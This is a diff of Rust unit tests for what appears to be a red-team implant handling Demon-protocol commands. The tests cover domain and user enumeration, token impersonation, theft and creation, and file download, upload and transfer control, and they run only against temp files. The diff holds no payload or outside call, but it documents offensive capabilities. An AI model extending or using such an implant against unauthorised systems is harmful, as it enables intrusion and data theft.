+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Ignore
         ));
     }
@@ -2913,7 +3263,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("CORP.LOCAL");
         let package = net_package(DemonNetCommand::Computer, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2931,7 +3282,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("CORP.LOCAL");
         let package = net_package(DemonNetCommand::DcList, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2943,7 +3295,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("FILESERV");
         let package = net_package(DemonNetCommand::Share, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2956,7 +3309,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let package = net_package(DemonNetCommand::Share, &[]);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Ignore
         ));
     }
@@ -2966,7 +3319,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("WORKSTATION");
         let package = net_package(DemonNetCommand::LocalGroup, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -2982,7 +3336,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("localhost");
         let package = net_package(DemonNetCommand::LocalGroup, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -3003,7 +3358,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("DC01");
         let package = net_package(DemonNetCommand::Group, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -3015,7 +3371,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("HOST01");
         let package = net_package(DemonNetCommand::Users, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -3028,7 +3385,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("localhost");
         let package = net_package(DemonNetCommand::Users, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new())
         else {
             panic!("expected Respond");
         };
@@ -3064,7 +3422,7 @@ mod tests {
         let mut config = SpecterConfig::default();
         let package = net_package(DemonNetCommand::Users, &[]);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut TokenVault::new()),
+            dispatch(&package, &mut config, &mut TokenVault::new(), &mut DownloadTracker::new()),
             DispatchResult::Ignore
         ));
     }
@@ -3084,10 +3442,13 @@ mod tests {
     fn token_impersonate_nonexistent_returns_failure() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         // Token ID 99 doesn't exist.
         let args = 99u32.to_le_bytes().to_vec();
         let package = token_package(DemonTokenCommand::Impersonate, &args);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
@@ -3105,8 +3466,11 @@ mod tests {
     fn token_list_empty_vault() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         let package = token_package(DemonTokenCommand::List, &[]);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
@@ -3123,6 +3487,7 @@ mod tests {
 
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         vault.add(TokenEntry {
             handle: 0xAA,
             domain_user: "DOM\\user1".to_string(),
@@ -3139,7 +3504,9 @@ mod tests {
         });
 
         let package = token_package(DemonTokenCommand::List, &[]);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
 
@@ -3179,8 +3546,11 @@ mod tests {
     fn token_getuid_returns_respond() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         let package = token_package(DemonTokenCommand::GetUid, &[]);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
@@ -3201,8 +3571,11 @@ mod tests {
     fn token_revert_returns_respond() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         let package = token_package(DemonTokenCommand::Revert, &[]);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -3219,9 +3592,12 @@ mod tests {
     fn token_remove_nonexistent_returns_failure() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         let args = 42u32.to_le_bytes().to_vec();
         let package = token_package(DemonTokenCommand::Remove, &args);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -3239,6 +3615,7 @@ mod tests {
 
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         let id = vault.add(TokenEntry {
             handle: 0,
             domain_user: "D\\U".to_string(),
@@ -3249,7 +3626,9 @@ mod tests {
 
         let args = id.to_le_bytes().to_vec();
         let package = token_package(DemonTokenCommand::Remove, &args);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -3267,6 +3646,7 @@ mod tests {
 
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         vault.add(TokenEntry {
             handle: 0,
             domain_user: "D\\U".to_string(),
@@ -3276,7 +3656,9 @@ mod tests {
         });
 
         let package = token_package(DemonTokenCommand::Clear, &[]);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -3291,8 +3673,11 @@ mod tests {
     fn token_find_returns_not_supported() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         let package = token_package(DemonTokenCommand::FindTokens, &[]);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -3308,10 +3693,13 @@ mod tests {
     fn token_privs_list_returns_respond() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         // list_privs = 1 (list mode)
         let args = 1u32.to_le_bytes().to_vec();
         let package = token_package(DemonTokenCommand::PrivsGetOrList, &args);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -3328,12 +3716,13 @@ mod tests {
         // On non-Windows, steal always fails; on Windows, PID 0 is invalid.
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         let mut args = Vec::new();
         args.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
         args.extend_from_slice(&0u32.to_le_bytes()); // handle = 0
         let package = token_package(DemonTokenCommand::Steal, &args);
         // On non-Windows stubs, steal returns Err → DispatchResult::Ignore.
-        let result = dispatch(&package, &mut config, &mut vault);
+        let result = dispatch(&package, &mut config, &mut vault, &mut downloads);
         assert!(matches!(result, DispatchResult::Ignore));
     }
 
@@ -3343,6 +3732,7 @@ mod tests {
     fn token_make_returns_respond_on_non_windows() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
 
         // Build args: [domain: wbytes][user: wbytes][password: wbytes][logon_type: u32]
         let mut args = Vec::new();
@@ -3362,7 +3752,9 @@ mod tests {
         args.extend_from_slice(&9u32.to_le_bytes()); // LOGON32_LOGON_NEW_CREDENTIALS
 
         let package = token_package(DemonTokenCommand::Make, &args);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+        let DispatchResult::Respond(resp) =
+            dispatch(&package, &mut config, &mut vault, &mut downloads)
+        else {
             panic!("expected Respond");
         };
         // On non-Windows: make_token fails, so response has subcmd but no domain_user.
@@ -3379,17 +3771,274 @@ mod tests {
     fn token_unknown_subcommand_returns_ignore() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         // Subcommand 255 is not defined.
         let payload = 255u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
-        assert!(matches!(dispatch(&package, &mut config, &mut vault), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut vault, &mut downloads),
+            DispatchResult::Ignore
+        ));
     }
 
     #[test]
     fn token_empty_payload_returns_ignore() {
         let mut config = SpecterConfig::default();
         let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
         let package = DemonPackage::new(DemonCommand::CommandToken, 1, vec![]);
-        assert!(matches!(dispatch(&package, &mut config, &mut vault), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut vault, &mut downloads),
+            DispatchResult::Ignore
+        ));
+    }
+
+    // ── CommandTransfer tests ───────────────────────────────────────────────
+
+    /// Build a CommandTransfer payload: `[subcmd: u32 LE][args…]`
+    fn transfer_payload(subcmd: u32, args: &[u8]) -> Vec<u8> {
+        let mut v = subcmd.to_le_bytes().to_vec();
+        v.extend_from_slice(args);
+        v
+    }
+
+    #[test]
+    fn transfer_list_empty_returns_subcmd_only() {
+        let payload = transfer_payload(0, &[]); // List = 0
+        let downloads = DownloadTracker::new();
+        let result = handle_transfer(&payload, &mut { downloads });
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandTransfer));
+        // Payload: just the subcommand echo (4 bytes).
+        assert_eq!(resp.payload.len(), 4);
+        let subcmd_echo = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
+        assert_eq!(subcmd_echo, 0); // List
+    }
+
+    #[test]
+    fn transfer_list_with_active_download() {
+        let mut downloads = DownloadTracker::new();
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("specter_test_tl_{}", rand::random::<u32>()));
+        std::fs::write(&path, b"data").expect("write");
+        let file = std::fs::File::open(&path).expect("open");
+        let file_id = downloads.add(file, 1, 4);
+
+        let payload = transfer_payload(0, &[]);
+        let result = handle_transfer(&payload, &mut downloads);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        // Payload: subcmd(4) + file_id(4) + read_size(4) + state(4) = 16 bytes
+        assert_eq!(resp.payload.len(), 16);
+        let listed_id = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
+        assert_eq!(listed_id, file_id);
+        let state = u32::from_le_bytes(resp.payload[12..16].try_into().expect("u32"));
+        assert_eq!(state, 1); // Running
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn transfer_stop_found() {
+        let mut downloads = DownloadTracker::new();
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("specter_test_ts_{}", rand::random::<u32>()));
+        std::fs::write(&path, b"data").expect("write");
+        let file = std::fs::File::open(&path).expect("open");
+        let file_id = downloads.add(file, 1, 4);
+
+        let payload = transfer_payload(1, &file_id.to_le_bytes());
+        let result = handle_transfer(&payload, &mut downloads);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        // [subcmd(4)][found(4)][file_id(4)]
+        assert_eq!(resp.payload.len(), 12);
+        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
+        assert_eq!(found, 1);
+        assert_eq!(downloads.get(file_id).expect("entry").state, DownloadState::Stopped);
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn transfer_stop_not_found() {
+        let mut downloads = DownloadTracker::new();
+        let payload = transfer_payload(1, &0xDEADu32.to_le_bytes());
+        let result = handle_transfer(&payload, &mut downloads);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
+        assert_eq!(found, 0);
+    }
+
+    #[test]
+    fn transfer_resume_found() {
+        let mut downloads = DownloadTracker::new();
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("specter_test_tr_{}", rand::random::<u32>()));
+        std::fs::write(&path, b"data").expect("write");
+        let file = std::fs::File::open(&path).expect("open");
+        let file_id = downloads.add(file, 1, 4);
+        downloads.get_mut(file_id).expect("entry").state = DownloadState::Stopped;
+
+        let payload = transfer_payload(2, &file_id.to_le_bytes());
+        let result = handle_transfer(&payload, &mut downloads);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
+        assert_eq!(found, 1);
+        assert_eq!(downloads.get(file_id).expect("entry").state, DownloadState::Running);
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn transfer_remove_found_returns_multi_respond() {
+        let mut downloads = DownloadTracker::new();
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("specter_test_trm_{}", rand::random::<u32>()));
+        std::fs::write(&path, b"data").expect("write");
+        let file = std::fs::File::open(&path).expect("open");
+        let file_id = downloads.add(file, 1, 4);
+
+        let payload = transfer_payload(3, &file_id.to_le_bytes());
+        let result = handle_transfer(&payload, &mut downloads);
+        let DispatchResult::MultiRespond(resps) = result else {
+            panic!("expected MultiRespond, got {result:?}");
+        };
+        assert_eq!(resps.len(), 2);
+        // First: [subcmd][found=1][file_id]
+        let found = u32::from_le_bytes(resps[0].payload[4..8].try_into().expect("u32"));
+        assert_eq!(found, 1);
+        // Second: [subcmd][file_id][reason=REMOVED(1)]
+        let reason = u32::from_le_bytes(resps[1].payload[8..12].try_into().expect("u32"));
+        assert_eq!(reason, DOWNLOAD_REASON_REMOVED);
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn transfer_remove_not_found_returns_single() {
+        let mut downloads = DownloadTracker::new();
+        let payload = transfer_payload(3, &0xBEEFu32.to_le_bytes());
+        let result = handle_transfer(&payload, &mut downloads);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        let found = u32::from_le_bytes(resp.payload[4..8].try_into().expect("u32"));
+        assert_eq!(found, 0);
+    }
+
+    #[test]
+    fn transfer_unknown_subcommand_returns_ignore() {
+        let mut downloads = DownloadTracker::new();
+        let payload = transfer_payload(255, &[]);
+        let result = handle_transfer(&payload, &mut downloads);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn transfer_empty_payload_returns_ignore() {
+        let mut downloads = DownloadTracker::new();
+        let result = handle_transfer(&[], &mut downloads);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    // ── FS Download tests ───────────────────────────────────────────────────
+
+    #[test]
+    fn fs_download_opens_file_and_returns_open_header() {
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("specter_test_fsd_{}", rand::random::<u32>()));
+        std::fs::write(&path, b"hello world").expect("write");
+
+        let path_str = path.display().to_string();
+        let rest = le_utf16le_payload(&path_str);
+        let mut downloads = DownloadTracker::new();
+        let result = handle_fs_download(2, &rest, 42, &mut downloads);
+
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond, got {result:?}");
+        };
+
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));
+
+        // Parse the BE header: [subcmd(4)][mode(4)][file_id(4)][file_size(8)][path…]
+        let payload = &resp.payload;
+        let subcmd = u32::from_be_bytes(payload[0..4].try_into().expect("u32"));
+        assert_eq!(subcmd, 2); // Download
+        let mode = u32::from_be_bytes(payload[4..8].try_into().expect("u32"));
+        assert_eq!(mode, DOWNLOAD_MODE_OPEN);
+        let file_size = u64::from_be_bytes(payload[12..20].try_into().expect("u64"));
+        assert_eq!(file_size, 11); // "hello world".len()
+
+        // Download should be registered.
+        assert_eq!(downloads.len(), 1);
+
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn fs_download_nonexistent_file_returns_ignore() {
+        let rest = le_utf16le_payload("/tmp/specter_nonexistent_file_test_12345");
+        let mut downloads = DownloadTracker::new();
+        let result = handle_fs_download(2, &rest, 1, &mut downloads);
+        assert!(matches!(result, DispatchResult::Ignore));
+        assert!(downloads.is_empty());
+    }
+
+    // ── FS Upload tests ─────────────────────────────────────────────────────
+
+    #[test]
+    fn fs_upload_writes_file_and_returns_response() {
+        let dir = std::env::temp_dir();
+        let path = dir.join(format!("specter_test_fsu_{}", rand::random::<u32>()));
+        let path_str = path.display().to_string();
+        let content = b"uploaded data";
+
+        // Build payload: [path: bytes LE][content: bytes LE]
+        let mut rest = le_utf16le_payload(&path_str);
+        rest.extend_from_slice(&(content.len() as u32).to_le_bytes());
+        rest.extend_from_slice(content);
+
+        let result = handle_fs_upload(3, &rest);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond, got {result:?}");
+        };
+
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));
+
+        // Verify file was written.
+        let written = std::fs::read(&path).expect("read back");
+        assert_eq!(written, content);
+
+        // Parse BE response: [subcmd(4)][file_size(4)][path…]
+        let file_size = u32::from_be_bytes(resp.payload[4..8].try_into().expect("u32"));
+        assert_eq!(file_size, content.len() as u32);
+
+        let _ = std::fs::remove_file(path);
+    }
+
+    #[test]
+    fn fs_upload_missing_content_returns_ignore() {
+        let rest = le_utf16le_payload("/tmp/specter_test_no_content");
+        // No content bytes after path — should fail to parse.
+        let result = handle_fs_upload(3, &rest);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    // ── dispatch routing tests for new commands ─────────────────────────────
+
+    #[test]
+    fn dispatch_routes_command_transfer() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let mut downloads = DownloadTracker::new();
+        let payload = transfer_payload(0, &[]); // Transfer::List
+        let package = DemonPackage::new(DemonCommand::CommandTransfer, 1, payload);
+        let result = dispatch(&package, &mut config, &mut vault, &mut downloads);
+        assert!(matches!(result, DispatchResult::Respond(_)));
     }
 }
